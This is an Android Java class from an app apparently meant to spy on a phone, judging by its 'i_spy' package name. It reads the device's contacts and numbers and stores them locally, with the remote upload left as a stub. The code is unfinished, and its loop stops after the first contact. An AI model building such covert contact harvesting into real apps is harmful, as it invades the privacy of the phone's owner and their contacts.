package com.um.asn.i_spy.manager;


import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.provider.ContactsContract;

import com.um.asn.i_spy.entities.ContactEntity;
import com.um.asn.i_spy.entities.PositionGPSEntity;
import com.um.asn.i_spy.models.Contact;
import com.um.asn.i_spy.models.Phone;

import java.util.ArrayList;

public class ContactManager {

    public Context context;
    public ConnectivityManager cm;
    public Phone phone;
    public ArrayList<Contact> contacts;

    public ContactManager(Context context, Phone phone) {
        this.context = context;
        this.phone = phone;
        this.cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        this.contacts = new ArrayList<Contact>();
    }

    public void run() {
        if (setContacts())
            insert();
    }

    public boolean setContacts() {
        ContentResolver cr = context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Contact contact = new Contact();

                    contact.setIdRef(cur.getInt(cur.getColumnIndex(ContactsContract.Contacts._ID)));
                    contact.setNom(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));

                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID))},
                            null
                    );

                    while (pCur.moveToNext()) {
                        if (!pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)).equals("")) {
                            contact.setNumero(pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                            break;
                        }
                    }

                    pCur.close();

                    contacts.add(contact);
                    return true;
                }
            }
        }
        return false;
    }

    public boolean insert() {
        return false;
    }

    // TODO : Comparer la liste créer avec la base
    // Si contact nouvelle liste non présent ou modif par rapport à BD local, rien
    // Sinon le delete de la nouvelle liste puis insert dist
    public void insertLocal() {
        ContactEntity myBD = new ContactEntity(this.context, PositionGPSEntity.POSITION_GPS_COLUMN_ID, null, 1);
        myBD.insert(this.contacts.get(0));
        System.out.println("Contact saved local (" + myBD.getAll().size() + ")");
    }

}
